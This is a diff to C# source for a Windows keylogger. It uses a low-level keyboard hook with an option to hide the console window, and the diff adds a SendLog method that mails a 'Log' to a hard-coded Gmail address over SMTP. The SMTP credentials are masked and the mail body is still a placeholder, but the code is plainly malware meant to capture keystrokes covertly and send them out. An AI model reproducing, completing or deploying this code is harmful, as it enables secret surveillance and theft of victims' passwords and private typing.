@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
@@ -19,8 +21,8 @@ namespace KeyLogger
 		{
 			var hWnd = GetConsoleWindow();
 			// ShowWindow(hWnd, SW_HIDE); // hide console window
-			
-			_hookID = SetHook(_proc);
+			// SendLog(); // for test
+            _hookID = SetHook(_proc);
 			Application.Run();
 			UnhookWindowsHookEx(_hookID);
 		}
@@ -61,8 +63,42 @@ namespace KeyLogger
 			return CallNextHookEx(_hookID, nCode, wParam, lParam);
 		}
 
+		public static void SendLog()
+		{
+			// TODO: need normal smtp server
+			using (var mail = new MailMessage
+			{
+				From = new MailAddress("***"), // from mail adress *@mail.com
+				To =
+				{
+					"mazillko@gmail.com"
+				},
+				Subject = "Log",
+				Body = "..."
+			})
+			{
+				using (var smtpServer = new SmtpClient("***") // smtp server 
+				{
+					Port = 25,
+					Credentials = new NetworkCredential("***", "***"), // user and password
+					EnableSsl = true
+					
+			})
+				{
+					try
+					{
+						smtpServer.Send(mail);
+					}
+					catch (Exception ex)
+					{
+						Console.WriteLine(ex.Message);
+					}
+				}
+			}
+		}
+
 		#region WinApi Functions
-			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 			private static extern IntPtr SetWindowsHookEx(int idHook,
 				LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
